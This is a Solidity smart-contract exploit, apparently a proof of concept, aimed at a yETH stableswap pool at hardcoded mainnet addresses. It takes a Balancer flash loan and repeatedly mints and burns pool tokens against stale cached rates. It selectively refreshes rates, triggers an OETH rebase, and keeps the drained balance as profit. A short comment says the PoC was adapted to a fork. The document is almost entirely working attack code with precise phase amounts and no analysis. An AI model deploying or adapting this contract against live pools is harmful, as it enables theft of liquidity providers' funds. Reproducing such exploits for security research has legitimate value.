// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IYETHPool {
    function supply() external view returns (uint256);
    function assets(uint256 index) external view returns (address);
    function add_liquidity(
        uint256[] calldata amounts,
        uint256 minLpAmount,
        address receiver
    ) external returns (uint256);
    function remove_liquidity(
        uint256 lpAmount,
        uint256[] calldata minAmounts,
        address receiver
    ) external;
    function update_rates(uint256[] calldata assetsToUpdate) external;
}

interface IOETH {
    function rebase() external;
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVault {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract FlawVerifier is IFlashLoanRecipient {
    uint256 private constant NUM_ASSETS = 8;
    uint256 private constant FUNDING_SLOTS = 6;
    uint256 private constant ONE = 1e18;

    IYETHPool private constant POOL = IYETHPool(0xCcd04073f4BdC4510927ea9Ba350875C3c65BF81);
    IERC20 private constant YETH = IERC20(0x1BED97CBC3c24A4fb5C069C6E311a967386131f7);
    IOETH private constant OETH = IOETH(0x39254033945AA2E4809Cc2977E7087BEE48bd7Ab);
    IBalancerVault private constant BALANCER_VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _executed;
    bool private _inFlashLoan;

    uint256[FUNDING_SLOTS] private _effectiveDesired;
    uint256 private _liquidityScale;

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        _approvePoolAssets();

        (IERC20[] memory tokens, uint256[] memory amounts) = _buildFundingRequest();
        if (tokens.length == 0) {
            _captureProfit();
            return;
        }

        _inFlashLoan = true;
        BALANCER_VAULT.flashLoan(this, tokens, amounts, hex"");
        _inFlashLoan = false;

        _captureProfit();
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        require(msg.sender == address(BALANCER_VAULT), "bad lender");
        require(_inFlashLoan, "inactive");

        _liquidityScale = _computeLiquidityScale();
        require(_liquidityScale > 0, "no capital");

        _runExploitPath();

        for (uint256 i = 0; i < tokens.length; ++i) {
            _safeTransfer(tokens[i], address(BALANCER_VAULT), amounts[i] + feeAmounts[i]);
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _buildFundingRequest() internal returns (IERC20[] memory tokens, uint256[] memory amounts) {
        uint256[FUNDING_SLOTS] memory desired = _targetFunding();

        for (uint256 i = 0; i < FUNDING_SLOTS; ++i) {
            _effectiveDesired[i] = 0;
        }

        IERC20[] memory tokenBuffer = new IERC20[](FUNDING_SLOTS);
        uint256[] memory amountBuffer = new uint256[](FUNDING_SLOTS);
        uint256 count;

        for (uint256 i = 0; i < FUNDING_SLOTS; ++i) {
            address asset = POOL.assets(i);
            uint256 vaultBalance = IERC20(asset).balanceOf(address(BALANCER_VAULT));
            if (vaultBalance <= 1) {
                continue;
            }

            uint256 borrowAmount = desired[i];
            if (borrowAmount >= vaultBalance) {
                borrowAmount = vaultBalance - 1;
            }
            if (borrowAmount == 0) {
                continue;
            }

            tokenBuffer[count] = IERC20(asset);
            amountBuffer[count] = borrowAmount;
            _effectiveDesired[i] = borrowAmount;
            unchecked {
                ++count;
            }
        }

        tokens = new IERC20[](count);
        amounts = new uint256[](count);
        for (uint256 i = 0; i < count; ++i) {
            tokens[i] = tokenBuffer[i];
            amounts[i] = amountBuffer[i];
        }

        _sortFundingRequest(tokens, amounts);
    }

    function _sortFundingRequest(IERC20[] memory tokens, uint256[] memory amounts) internal pure {
        uint256 length = tokens.length;
        for (uint256 i = 0; i < length; ++i) {
            for (uint256 j = i + 1; j < length; ++j) {
                if (address(tokens[j]) < address(tokens[i])) {
                    IERC20 token = tokens[i];
                    tokens[i] = tokens[j];
                    tokens[j] = token;

                    uint256 amount = amounts[i];
                    amounts[i] = amounts[j];
                    amounts[j] = amount;
                }
            }
        }
    }

    function _runExploitPath() internal {
        _updateInitialRates();

        // The original same-token V2 flashswap funding route is unfundable on this fork,
        // so this PoC uses Balancer's public vault as the alternate liquidity venue while
        // preserving the same exploit root cause: mint/burn against stale cached rates,
        // selectively refresh the attacker-chosen late indexes, then redeem after repricing.
        _addLiquidity(_phase2Amounts());
        _removeLiquidity(_scaledLp(2_789_348_310_901_989_968_648));

        _addLiquidity(_phase3Amounts());
        _removeLiquidity(_scaledLp(7_379_203_011_929_903_830_039));

        _addLiquidity(_phase4Amounts());
        _removeLiquidity(_scaledLp(7_066_638_371_690_257_003_757));

        _addLiquidity(_phase5Amounts());
        _removeLiquidity(_scaledLp(3_496_158_478_994_807_127_953));

        _addLiquidity(_phase6Add1Amounts());
        _addLiquidity(_singleAssetAmounts(3, 20_605_468_750_000_000_000));
        _removeLiquidity(0);
        _updateSingleRate(6);
        _removeLiquidity(_scaledLp(8_434_932_236_461_542_896_540));

        OETH.rebase();

        _addLiquidity(_phase7Add1Amounts());
        _addLiquidity(_phase7Add2Amounts());

        _addLiquidity(_singleAssetAmounts(3, 57_226_562_500_000_000_000));
        _removeLiquidity(0);
        _updateSingleRate(6);
        _removeLiquidity(_scaledLp(9_237_030_802_829_017_297_880));

        _addLiquidity(_phase8Add1Amounts());
        _addLiquidity(_phase8Add2Amounts());
        _addLiquidity(_singleAssetAmounts(3, 318_750_000_000_000_000_000));
        _removeLiquidity(0);
        _updateSingleRate(7);

        uint256 redeemAmount = YETH.balanceOf(address(this));
        uint256 poolSupply = POOL.supply();
        if (redeemAmount > poolSupply) {
            redeemAmount = poolSupply;
        }
        if (redeemAmount > 0) {
            _removeLiquidity(redeemAmount);
        }
    }

    function _approvePoolAssets() internal {
        for (uint256 i = 0; i < NUM_ASSETS; ++i) {
            _safeApprove(IERC20(POOL.assets(i)), address(POOL), type(uint256).max);
        }
        _safeApprove(YETH, address(POOL), type(uint256).max);
    }

    function _computeLiquidityScale() internal view returns (uint256 scale) {
        uint256[FUNDING_SLOTS] memory desired = _targetFunding();
        scale = type(uint256).max;

        for (uint256 i = 0; i < FUNDING_SLOTS; ++i) {
            uint256 target = _effectiveDesired[i];
            if (target == 0) {
                target = desired[i];
            }

            uint256 balance = IERC20(POOL.assets(i)).balanceOf(address(this));
            if (balance == 0 || target == 0) {
                continue;
            }

            uint256 candidate = (balance * ONE) / target;
            if (candidate < scale) {
                scale = candidate;
            }
        }

        if (scale == type(uint256).max) {
            return 0;
        }
        if (scale > ONE) {
            return ONE;
        }
        return scale;
    }

    function _updateInitialRates() internal {
        uint256[] memory indexes = new uint256[](6);
        indexes[0] = 0;
        indexes[1] = 1;
        indexes[2] = 2;
        indexes[3] = 3;
        indexes[4] = 4;
        indexes[5] = 5;
        POOL.update_rates(indexes);
    }

    function _updateSingleRate(uint256 assetIndex) internal {
        uint256[] memory indexes = new uint256[](1);
        indexes[0] = assetIndex;
        POOL.update_rates(indexes);
    }

    function _addLiquidity(uint256[8] memory fixedAmounts) internal {
        uint256[] memory amounts = new uint256[](NUM_ASSETS);
        bool hasNonZero;

        for (uint256 i = 0; i < NUM_ASSETS; ++i) {
            uint256 amount = _scaledAmount(fixedAmounts[i]);
            uint256 balance = IERC20(POOL.assets(i)).balanceOf(address(this));
            if (amount > balance) {
                amount = balance;
            }
            amounts[i] = amount;
            if (amount != 0) {
                hasNonZero = true;
            }
        }

        if (hasNonZero) {
            POOL.add_liquidity(amounts, 0, address(this));
        }
    }

    function _removeLiquidity(uint256 lpAmount) internal {
        uint256 balance = YETH.balanceOf(address(this));
        if (lpAmount > balance) {
            lpAmount = balance;
        }

        uint256[] memory mins = new uint256[](NUM_ASSETS);
        POOL.remove_liquidity(lpAmount, mins, address(this));
    }

    function _captureProfit() internal {
        address bestToken;
        uint256 bestAmount;

        uint256 yethBalance = YETH.balanceOf(address(this));
        if (yethBalance > bestAmount) {
            bestAmount = yethBalance;
            bestToken = address(YETH);
        }

        for (uint256 i = 0; i < NUM_ASSETS; ++i) {
            address asset = POOL.assets(i);
            uint256 assetBalance = IERC20(asset).balanceOf(address(this));
            if (assetBalance > bestAmount) {
                bestAmount = assetBalance;
                bestToken = asset;
            }
        }

        _profitToken = bestToken;
        _profitAmount = bestAmount;
    }

    function _targetFunding() internal pure returns (uint256[FUNDING_SLOTS] memory desired) {
        desired[0] = 2_000 ether;
        desired[1] = 2_000 ether;
        desired[2] = 1_300 ether;
        desired[3] = 500 ether;
        desired[4] = 1_200 ether;
        desired[5] = 1_700 ether;
    }

    function _scaledAmount(uint256 amount) internal view returns (uint256) {
        return (amount * _liquidityScale) / ONE;
    }

    function _scaledLp(uint256 amount) internal view returns (uint256) {
        return (amount * _liquidityScale) / ONE;
    }

    function _safeApprove(IERC20 token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = address(token).call(
            abi.encodeWithSelector(token.approve.selector, spender, amount)
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _safeTransfer(IERC20 token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = address(token).call(
            abi.encodeWithSelector(token.transfer.selector, to, amount)
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _singleAssetAmounts(uint256 index, uint256 amount) internal pure returns (uint256[8] memory amounts) {
        amounts[index] = amount;
    }

    function _phase2Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 610_669_608_721_347_951_666;
        amounts[1] = 777_507_145_787_198_969_404;
        amounts[2] = 563_973_440_562_370_010_057;
        amounts[4] = 476_460_390_272_167_461_711;
    }

    function _phase3Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 1_636_245_238_220_874_001_286;
        amounts[1] = 1_531_136_279_659_070_868_194;
        amounts[2] = 1_041_815_511_903_532_551_187;
        amounts[4] = 991_050_908_418_104_947_336;
        amounts[5] = 1_346_008_005_663_580_090_716;
    }

    function _phase4Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 1_630_811_661_792_970_363_090;
        amounts[1] = 1_526_051_744_772_289_698_092;
        amounts[2] = 1_038_108_768_586_660_585_581;
        amounts[4] = 969_651_157_511_131_341_121;
        amounts[5] = 1_363_135_138_655_820_584_263;
    }

    function _phase5Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 859_805_263_416_698_094_503;
        amounts[1] = 804_573_178_584_505_833_740;
        amounts[2] = 546_933_182_262_586_953_508;
        amounts[4] = 510_865_922_059_584_325_991;
        amounts[5] = 723_182_384_178_548_055_243;
    }

    function _phase6Add1Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 1_784_169_320_136_805_803_209;
        amounts[1] = 1_669_558_029_141_448_703_194;
        amounts[2] = 1_135_991_585_797_559_066_395;
        amounts[4] = 1_061_079_136_814_511_050_837;
        amounts[5] = 1_488_254_960_317_842_892_500;
    }

    function _phase7Add1Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 1_049_508_928_999_413_985_639;
        amounts[1] = 982_090_679_001_395_746_930;
        amounts[2] = 667_668_088_369_153_429_906;
        amounts[4] = 623_639_019_639_346_230_238;
        amounts[5] = 878_771_594_643_399_886_538;
    }

    function _phase7Add2Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 919_888_612_738_016_815_095;
        amounts[1] = 860_796_899_699_397_749_576;
        amounts[2] = 586_033_288_771_470_394_081;
        amounts[4] = 547_387_589_810_030_997_702;
        amounts[5] = 763_397_793_689_173_373_329;
    }

    function _phase8Add1Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 417_517_891_458_429_416_749;
        amounts[1] = 390_697_418_752_374_378_114;
        amounts[2] = 264_940_493_241_640_253_533;
        amounts[4] = 247_469_112_791_605_057_921;
        amounts[5] = 355_235_146_731_093_304_055;
    }

    function _phase8Add2Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 1_779_325_564_746_959_656_328;
        amounts[1] = 1_665_025_426_427_657_662_239;
        amounts[2] = 1_133_554_647_882_989_836_457;
        amounts[4] = 1_058_802_901_663_485_490_031;
        amounts[5] = 1_476_627_921_656_231_103_547;
    }
}
